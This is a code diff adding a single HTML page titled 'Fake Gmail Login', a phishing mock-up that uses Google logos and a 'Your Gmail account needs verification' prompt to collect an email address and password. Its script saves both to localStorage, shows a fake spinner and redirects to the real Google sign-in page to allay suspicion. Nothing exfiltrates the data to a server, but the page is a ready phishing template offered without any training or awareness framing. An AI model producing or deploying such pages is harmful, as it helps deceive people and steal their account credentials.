@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fake Gmail Login</title>
+    <style>
+        body {
+            background-color: lightyellow;  /* Set background to light yellow */
+            font-family: Arial, sans-serif; /* Set font for better readability */
+            padding: 20px;
+            text-align: center;
+            background-image: url('https://upload.wikimedia.org/wikipedia/commons/4/42/Google_2015_logo.svg'); /* Google Logo */
+            background-position: center;  /* Position logo in the center */
+            background-size: 20%; /* Resize the logo */
+            background-repeat: no-repeat;  /* Prevent repeating the image */
+            background-attachment: fixed;  /* Keep the image in place when scrolling */
+        }
+        h2 {
+            color: #333;
+        }
+        input[type="email"], input[type="password"] {
+            padding: 10px;
+            width: 250px;
+            margin: 5px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        input[type="submit"] {
+            padding: 10px 20px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        input[type="submit"]:hover {
+            background-color: #45a049;
+        }
+        #loginForm {
+            display: block;
+            margin-top: 20px;
+        }
+        #loadingSpinner {
+            display: none;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Google logo at the top -->
+    <img src="https://upload.wikimedia.org/wikipedia/commons/4/42/Google_2015_logo.svg" alt="Google Logo" style="width: 150px;">
+
+    <h2>Your Gmail account needs verification</h2>
+    <form id="loginForm">
+        <label for="email">Email:</label><br>
+        <input type="email" id="email" name="email" placeholder="Enter your email" required><br><br>
+        
+        <label for="password">Password:</label><br>
+        <input type="password" id="password" name="password" placeholder="Enter your password" required><br><br>
+
+        <input type="submit" value="Login">
+    </form>
+
+    <!-- Fake Loading Spinner -->
+    <div id="loadingSpinner">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/d/d3/Google_logo_2015.svg" alt="Loading" style="width: 50px; height: 50px;">
+        <p>Redirecting to Gmail...</p>
+    </div>
+
+    <script>
+        // Event listener for form submission
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();  // Prevent form from submitting
+
+            // Get user email and password from the form
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+
+            // Save login details to localStorage
+            localStorage.setItem('userEmail', email);
+            localStorage.setItem('userPassword', password);
+
+            // Show loading spinner
+            document.getElementById('loadingSpinner').style.display = 'block';
+
+            // Simulate redirection after 2 seconds
+            setTimeout(function() {
+                alert('Login details saved! Redirecting to Gmail...');
+                window.location.href = "https://accounts.google.com/";
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
